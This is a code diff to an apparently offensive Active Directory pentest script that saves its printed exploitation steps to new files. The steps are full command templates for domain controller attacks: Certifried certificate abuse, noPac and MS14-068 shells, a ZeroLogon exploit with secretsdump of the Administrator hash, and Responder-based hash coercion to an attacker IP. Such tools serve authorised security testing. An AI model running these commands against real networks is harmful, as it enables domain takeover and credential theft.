@@ -360,6 +360,7 @@ prepare() {
     mkdir -p "${output_dir}/Scans"
     mkdir -p "${output_dir}/Shares"
     mkdir -p "${output_dir}/Vulnerabilities"
+    mkdir -p "${output_dir}/Exploitation"
 
     if [ ! -f "${servers_ip_list}" ]; then /bin/touch "${servers_ip_list}"; fi
     if [ ! -f "${servers_hostname_list}" ]; then /bin/touch "${servers_hostname_list}"; fi
@@ -1544,7 +1545,7 @@ certipy_enum() {
             fi
         fi
     fi
-    adcs_vuln_parse | tee "${output_dir}/ADCS/adcs_exploitation_steps_${dc_domain}.txt"
+    adcs_vuln_parse | tee "${output_dir}/Exploitation/ADCS_exploitation_steps_${dc_domain}.txt"
     echo -e ""
 }
 
@@ -1706,15 +1707,15 @@ certifried_check() {
                 pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
                 run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -target ${pki_server} -ca ${pki_ca} -template User" 2>&1 | tee "${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt"
                 if ! grep -q "Certificate object SID is" "${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt" && ! grep -q "error" "${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt"; then
-                    echo -e "${GREEN}[+] ${pki_server} potentially vulnerable to Certifried! Follow steps below for exploitation:${NC}"
-                    echo -e "${CYAN}1. Create a new computer account with a dNSHostName property of a Domain Controller:${NC}"
-                    echo -e "${certipy} account create ${argument_certipy} -user NEW_COMPUTER_NAME -pass NEW_COMPUTER_PASS -dc-ip $dc_ip -dns $dc_NETBIOS.$dc_domain"
-                    echo -e "${CYAN}2. Obtain a certificate for the new computer:${NC}"
-                    echo -e "${certipy} req -u NEW_COMPUTER_NAME\$@${dc_domain} -p NEW_COMPUTER_PASS -dc-ip $dc_ip -target $pki_server -ca ${pki_ca} -template Machine"
-                    echo -e "${CYAN}3. Authenticate using pfx:${NC}"
-                    echo -e "${certipy} auth -pfx ${dc_NETBIOS}.pfx -username ${dc_NETBIOS}\$ -dc-ip ${dc_ip}"
-                    echo -e "${CYAN}4. Delete the created computer:${NC}"
-                    echo -e "${certipy} account delete ${argument_certipy} -dc-ip ${dc_ip} -user NEW_COMPUTER_NAME "
+                    echo -e "${GREEN}[+] ${pki_server} potentially vulnerable to Certifried! Follow steps below for exploitation:${NC}" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
+                    echo -e "${CYAN}1. Create a new computer account with a dNSHostName property of a Domain Controller:${NC}" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
+                    echo -e "${certipy} account create ${argument_certipy} -user NEW_COMPUTER_NAME -pass NEW_COMPUTER_PASS -dc-ip $dc_ip -dns $dc_NETBIOS.$dc_domain" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
+                    echo -e "${CYAN}2. Obtain a certificate for the new computer:${NC}" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
+                    echo -e "${certipy} req -u NEW_COMPUTER_NAME\$@${dc_domain} -p NEW_COMPUTER_PASS -dc-ip $dc_ip -target $pki_server -ca ${pki_ca} -template Machine" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
+                    echo -e "${CYAN}3. Authenticate using pfx:${NC}" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
+                    echo -e "${certipy} auth -pfx ${dc_NETBIOS}.pfx -username ${dc_NETBIOS}\$ -dc-ip ${dc_ip}" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
+                    echo -e "${CYAN}4. Delete the created computer:${NC}" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
+                    echo -e "${certipy} account delete ${argument_certipy} -dc-ip ${dc_ip} -user NEW_COMPUTER_NAME " | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
                 fi
             done
             cd "${current_dir}" || exit
@@ -2057,11 +2058,11 @@ nopac_check() {
         while IFS= read -r i; do
             run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M nopac --log ${output_dir}/Vulnerabilities/ne_nopac_output_${dc_domain}.txt" 2>&1
             if grep -q "VULNERABLE" "${output_dir}/Vulnerabilities/ne_nopac_output_${dc_domain}.txt"; then
-                echo -e "${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}"
-                echo -e "${CYAN}# Get shell:${NC}"
-                echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -shell [-use-ldap]"
-                echo -e "${CYAN}# Dump hashes:${NC}"
-                echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -dump [-use-ldap]"
+                echo -e "${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
+                echo -e "${CYAN}# Get shell:${NC}" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
+                echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -shell [-use-ldap]" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
+                echo -e "${CYAN}# Dump hashes:${NC}" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
+                echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -dump [-use-ldap]" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
             fi
         done <"${target_dc}"
     fi
@@ -2078,9 +2079,9 @@ ms14-068_check() {
         else
             run_command "${impacket_goldenPac} ${argument_imp_gp}\\@${dc_FQDN} None -target-ip ${dc_ip}" 2>&1 | tee "${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt"
             if grep -q "found vulnerable" "${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt"; then
-                echo -e "${GREEN}[+] Domain controller vulnerable to MS14-068 found (False positives possible on newer versions of Windows)!${NC}"
-                echo -e "${CYAN}# Execute command below to get shell:${NC}"
-                echo -e "${impacket_goldenPac} ${argument_imp}@${dc_FQDN} -target-ip ${dc_ip}"
+                echo -e "${GREEN}[+] Domain controller vulnerable to MS14-068 found (False positives possible on newer versions of Windows)!${NC}" | tee -a "${output_dir}/Exploitation/ms14-068_exploitation_steps_${dc_domain}.txt"
+                echo -e "${CYAN}# Execute command below to get shell:${NC}" | tee -a "${output_dir}/Exploitation/ms14-068_exploitation_steps_${dc_domain}.txt"
+                echo -e "${impacket_goldenPac} ${argument_imp}@${dc_FQDN} -target-ip ${dc_ip}" | tee -a "${output_dir}/Exploitation/ms14-068_exploitation_steps_${dc_domain}.txt"
             fi
         fi
     fi
@@ -2302,15 +2303,15 @@ zerologon_check() {
         run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M zerologon --log ${output_dir}/Vulnerabilities/ne_zerologon_output_${dc_domain}.txt" 2>&1
     done <"${target_dc}"
     if grep -q "VULNERABLE" "${output_dir}/Vulnerabilities/ne_zerologon_output_${dc_domain}.txt"; then
-        echo -e "${GREEN}[+] Domain controller vulnerable to ZeroLogon found! Follow steps below for exploitation:${NC}"
-        echo -e "${CYAN}1. Exploit the vulnerability, set the NT hash to \\x00*8:${NC}"
-        echo -e "cve-2020-1472-exploit.py $dc_NETBIOS $dc_ip"
-        echo -e "${CYAN}2. Obtain the Domain Admin's NT hash:${NC}"
-        echo -e "secretsdump.py $dc_domain/$dc_NETBIOS\$@$dc_ip -no-pass -just-dc-user Administrator"
-        echo -e "${CYAN}3. Obtain the machine account hex encoded password:${NC}"
-        echo -e "secretsdump.py -hashes :<NTLMhash_Administrator> $dc_domain/Administrator@$dc_ip"
-        echo -e "${CYAN}4. Restore the machine account password:${NC}"
-        echo -e "restorepassword.py -target-ip $dc_ip $dc_domain/$dc_NETBIOS@$dc_NETBIOS -hexpass <HexPass_$dc_NETBIOS>"
+        echo -e "${GREEN}[+] Domain controller vulnerable to ZeroLogon found! Follow steps below for exploitation:${NC}" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
+        echo -e "${CYAN}1. Exploit the vulnerability, set the NT hash to \\x00*8:${NC}" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
+        echo -e "cve-2020-1472-exploit.py $dc_NETBIOS $dc_ip" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
+        echo -e "${CYAN}2. Obtain the Domain Admin's NT hash:${NC}" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
+        echo -e "secretsdump.py $dc_domain/$dc_NETBIOS\$@$dc_ip -no-pass -just-dc-user Administrator" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
+        echo -e "${CYAN}3. Obtain the machine account hex encoded password:${NC}" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
+        echo -e "secretsdump.py -hashes :<NTLMhash_Administrator> $dc_domain/Administrator@$dc_ip" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
+        echo -e "${CYAN}4. Restore the machine account password:${NC}" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
+        echo -e "restorepassword.py -target-ip $dc_ip $dc_domain/$dc_NETBIOS@$dc_NETBIOS -hexpass <HexPass_$dc_NETBIOS>" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
     fi
     echo -e ""
 }
@@ -2459,11 +2460,11 @@ coercer_check() {
         smb_scan
         run_command "${coercer} scan ${argument_coercer} -f ${servers_smb_list} --dc-ip $dc_ip --auth-type smb --export-xlsx ${output_dir}/Vulnerabilities/Coercer/coercer_output_${dc_domain}.xlsx" | tee "${output_dir}/Vulnerabilities/Coercer/coercer_output_${dc_domain}.txt"
         if grep -q -r "SMB  Auth" "${output_dir}/Vulnerabilities/Coercer/"; then
-            echo -e "${GREEN}[+] Servers vulnerable to Coerce attacks found! Follow steps below for exploitation:${NC}"
-            echo -e "${CYAN}1. Run responder on second terminal to capture hashes:${NC}"
-            echo -e "sudo responder -I $attacker_interface"
-            echo -e "${CYAN}2. Coerce target server:${NC}"
-            echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip"
+            echo -e "${GREEN}[+] Servers vulnerable to Coerce attacks found! Follow steps below for exploitation:${NC}" | tee -a "${output_dir}/Exploitation/coercer_exploitation_steps_${dc_domain}.txt"
+            echo -e "${CYAN}1. Run responder on second terminal to capture hashes:${NC}" | tee -a "${output_dir}/Exploitation/coercer_exploitation_steps_${dc_domain}.txt"
+            echo -e "sudo responder -I $attacker_interface" | tee -a "${output_dir}/Exploitation/coercer_exploitation_steps_${dc_domain}.txt"
+            echo -e "${CYAN}2. Coerce target server:${NC}" | tee -a "${output_dir}/Exploitation/coercer_exploitation_steps_${dc_domain}.txt"
+            echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip" | tee -a "${output_dir}/Exploitation/coercer_exploitation_steps_${dc_domain}.txt"
         fi
         echo -e ""
     fi
